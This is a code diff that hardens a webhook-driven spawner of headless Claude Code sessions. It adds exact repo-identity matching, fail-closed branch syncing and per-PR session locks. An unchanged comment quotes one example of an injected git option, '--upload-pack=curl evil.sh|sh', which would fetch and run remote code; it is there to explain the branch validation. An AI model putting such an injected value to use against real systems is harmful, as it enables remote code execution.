@@ -12,6 +12,7 @@ import threading
 from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any, ClassVar
+from urllib.parse import urlsplit
 
 import structlog
 
@@ -43,6 +44,29 @@ def _sanitize_repo_slug(repo: str) -> str:
     everywhere webhook strings hit the filesystem.
     """
     return re.sub(r"[^A-Za-z0-9._-]", "_", repo)
+
+
+def _normalize_repo_identifier(value: str) -> str:
+    """Normalize a repo identifier or remote URL to ``owner/repo``.
+
+    Handles plain ``owner/repo``, HTTPS remotes, and SSH scp-like
+    remotes. Returns lowercase for exact comparisons.
+    """
+    raw = value.strip().removesuffix(".git")
+    if not raw:
+        return ""
+    if "://" in raw:
+        parts = urlsplit(raw)
+        path = parts.path.strip("/")
+    elif "@" in raw and ":" in raw:
+        path = raw.split(":", 1)[1].strip("/")
+    else:
+        path = raw.strip("/")
+    path = path.removesuffix(".git")
+    pieces = [p for p in path.split("/") if p]
+    if len(pieces) < 2:
+        return path.lower()
+    return "/".join(pieces[-2:]).lower()
 
 
 def _try_claim_pr_session(
@@ -257,7 +281,7 @@ class SessionSpawner:
 
     def _ensure_branch_current(
         self, branch: str, log: Any, expected_repo: str = "",
-    ) -> None:
+    ) -> bool:
         """Fetch and checkout the PR branch so the agent works on current code.
 
         Args:
@@ -267,14 +291,15 @@ class SessionSpawner:
         """
         cwd = self._repo_path or os.getenv("CLIENT_REPO_PATH", "")
         if not cwd or not branch:
-            return
+            log.error("branch_sync_missing_repo_or_branch", branch=branch)
+            return False
         # Reject webhook-controlled branches that could be parsed as
         # git options (e.g. "--upload-pack=curl evil.sh|sh"). Without
         # the '--' sentinel OR an allowlist check git would treat the
         # branch as a flag. Fail closed and log.
         if not _is_safe_branch(branch):
             log.error("unsafe_branch_name_rejected", branch=branch[:100])
-            return
+            return False
         try:
             # Verify repo identity if expected_repo provided
             if expected_repo:
@@ -283,13 +308,16 @@ class SessionSpawner:
                     cwd=cwd, capture_output=True, text=True, timeout=5,
                 )
                 origin_url = result.stdout.strip()
-                if expected_repo not in origin_url:
+                if (
+                    _normalize_repo_identifier(origin_url)
+                    != _normalize_repo_identifier(expected_repo)
+                ):
                     log.error(
                         "repo_mismatch",
                         expected=expected_repo,
                         actual_origin=origin_url,
                     )
-                    return  # Do NOT operate on wrong repo
+                    return False  # Do NOT operate on wrong repo
 
             # Defense in depth: validated branch name above, AND pass
             # '--' sentinel so git stops parsing options.
@@ -299,7 +327,7 @@ class SessionSpawner:
             )
             if fetch.returncode != 0:
                 log.error("git_fetch_failed", branch=branch, stderr=fetch.stderr[:200])
-                return
+                return False
 
             # git checkout cannot use '--' sentinel — it would make git
             # interpret <branch> as a pathspec rather than a branch
@@ -312,7 +340,7 @@ class SessionSpawner:
             )
             if checkout.returncode != 0:
                 log.error("git_checkout_failed", branch=branch, stderr=checkout.stderr[:200])
-                return
+                return False
 
             pull = subprocess.run(
                 ["git", "pull", "--ff-only", "origin", "--", branch],
@@ -323,8 +351,10 @@ class SessionSpawner:
                 # Non-fatal — checkout succeeded, local may just be ahead
 
             log.info("branch_synced", branch=branch)
+            return True
         except (subprocess.TimeoutExpired, OSError) as exc:
             log.warning("branch_sync_failed", branch=branch, error=str(exc)[:200])
+            return False
 
     def _prepare_session(
         self,
@@ -333,7 +363,7 @@ class SessionSpawner:
         pr_number: int,
         branch: str = "",
         repo: str = "",
-    ) -> Any:
+    ) -> tuple[Any, bool]:
         """Bind a logger and sync the worktree branch (if given).
 
         Shared prelude for every ``spawn_*`` method. Previously the
@@ -346,8 +376,8 @@ class SessionSpawner:
         """
         log = logger.bind(pr_number=pr_number, session_type=session_type)
         if branch:
-            self._ensure_branch_current(branch, log, expected_repo=repo)
-        return log
+            return log, self._ensure_branch_current(branch, log, expected_repo=repo)
+        return log, True
 
     def spawn_pr_review(
         self, pr_number: int, pr_diff: str, ticket_context: str,
@@ -378,9 +408,11 @@ class SessionSpawner:
             return False
 
         try:
-            self._prepare_session(
+            _log, ready = self._prepare_session(
                 "pr-review", pr_number=pr_number, branch=branch, repo=repo,
             )
+            if not ready:
+                return False
             prompt = _PROMPT_PR_REVIEW.format(
                 pr_number=pr_number,
                 bot_marker=BOT_COMMENT_MARKER,
@@ -397,6 +429,7 @@ class SessionSpawner:
                 prompt,
                 role="l3_pr_review",
                 pr_number=pr_number,
+                repo=repo,
                 claim_fd=claim_fd,
             )
         except BaseException:
@@ -409,18 +442,38 @@ class SessionSpawner:
         repo: str = "",
     ) -> bool:
         """Spawn a Sonnet session to fix CI failures."""
-        self._prepare_session(
-            "ci-fix", pr_number=pr_number, branch=branch, repo=repo,
-        )
-        prompt = _PROMPT_CI_FIX.format(
-            pr_number=pr_number,
-            branch=branch,
-            bot_marker=BOT_COMMENT_MARKER,
-            failure_logs=self._sanitize_ci_logs(failure_logs[:3000]),
-        )
-        return self._spawn(
-            "ci-fix", prompt, role="l3_ci_fix", pr_number=pr_number
-        )
+        claim_fd = _try_claim_pr_session(LOGS_DIR, repo, pr_number, "ci-fix")
+        if claim_fd is None:
+            logger.info(
+                "ci_fix_spawn_already_in_progress",
+                pr_number=pr_number,
+                repo=repo,
+            )
+            return False
+        try:
+            _log, ready = self._prepare_session(
+                "ci-fix", pr_number=pr_number, branch=branch, repo=repo,
+            )
+            if not ready:
+                return False
+            prompt = _PROMPT_CI_FIX.format(
+                pr_number=pr_number,
+                branch=branch,
+                bot_marker=BOT_COMMENT_MARKER,
+                failure_logs=self._sanitize_ci_logs(failure_logs[:3000]),
+            )
+            result = self._spawn(
+                "ci-fix",
+                prompt,
+                role="l3_ci_fix",
+                pr_number=pr_number,
+                repo=repo,
+                claim_fd=claim_fd,
+            )
+            claim_fd = None
+            return result
+        finally:
+            _release_pr_claim(claim_fd)
 
     @staticmethod
     def _sanitize_tag(text: str, tag: str) -> str:
@@ -460,21 +513,40 @@ class SessionSpawner:
         branch: str = "", repo: str = "",
     ) -> bool:
         """Spawn a session to respond to a human review comment."""
-        self._prepare_session(
-            "comment-response", pr_number=pr_number, branch=branch, repo=repo,
+        claim_fd = _try_claim_pr_session(
+            LOGS_DIR, repo, pr_number, "comment-response"
         )
-        prompt = _PROMPT_COMMENT_RESPONSE.format(
-            pr_number=pr_number,
-            comment_author=comment_author,
-            comment_body=self._sanitize_user_content(comment_body[:3000]),
-            bot_marker=BOT_COMMENT_MARKER,
-        )
-        return self._spawn(
-            "comment-response",
-            prompt,
-            role="l3_comment_response",
-            pr_number=pr_number,
-        )
+        if claim_fd is None:
+            logger.info(
+                "comment_response_spawn_already_in_progress",
+                pr_number=pr_number,
+                repo=repo,
+            )
+            return False
+        try:
+            _log, ready = self._prepare_session(
+                "comment-response", pr_number=pr_number, branch=branch, repo=repo,
+            )
+            if not ready:
+                return False
+            prompt = _PROMPT_COMMENT_RESPONSE.format(
+                pr_number=pr_number,
+                comment_author=comment_author,
+                comment_body=self._sanitize_user_content(comment_body[:3000]),
+                bot_marker=BOT_COMMENT_MARKER,
+            )
+            result = self._spawn(
+                "comment-response",
+                prompt,
+                role="l3_comment_response",
+                pr_number=pr_number,
+                repo=repo,
+                claim_fd=claim_fd,
+            )
+            claim_fd = None
+            return result
+        finally:
+            _release_pr_claim(claim_fd)
 
     # Default timeout per session type (seconds). Override via L3_SESSION_TIMEOUT.
     _TIMEOUTS: ClassVar[dict[str, int]] = {
@@ -490,6 +562,7 @@ class SessionSpawner:
         role: str = "l3_pr_review",
         pr_number: int = 0,
         model: str = "",
+        repo: str = "",
         claim_fd: int | None = None,
     ) -> bool:
         """Launch a Claude Code headless session with logging and timeout.
@@ -513,13 +586,16 @@ class SessionSpawner:
 
         cwd = self._repo_path or os.getenv("CLIENT_REPO_PATH", "")
         if not cwd:
-            log.warning("no_repo_path_for_session", hint="Set CLIENT_REPO_PATH env var")
+            log.error("no_repo_path_for_session", hint="Set CLIENT_REPO_PATH env var")
+            _release_pr_claim(claim_fd)
+            return False
 
         env = sanitized_env()
 
-        ts = datetime.now(UTC).strftime("%Y%m%d-%H%M%S")
-        log_file = LOGS_DIR / f"pr-{pr_number}-{session_type}-{ts}.log"
-        pid_file = LOGS_DIR / f"pr-{pr_number}-{session_type}.pid"
+        ts = datetime.now(UTC).strftime("%Y%m%d-%H%M%S-%f")
+        repo_slug = _sanitize_repo_slug(_normalize_repo_identifier(repo) or Path(cwd).name)
+        log_file = LOGS_DIR / f"pr-{repo_slug}-{pr_number}-{session_type}-{ts}.log"
+        pid_file = LOGS_DIR / f"pr-{repo_slug}-{pr_number}-{session_type}.pid"
 
         timeout = int(os.getenv(
             "L3_SESSION_TIMEOUT",
@@ -530,7 +606,7 @@ class SessionSpawner:
             with log_file.open("w") as f:
                 proc = subprocess.Popen(
                     cmd,
-                    cwd=cwd or None,
+                    cwd=cwd,
                     stdout=f,
                     stderr=subprocess.STDOUT,
                     env=env,
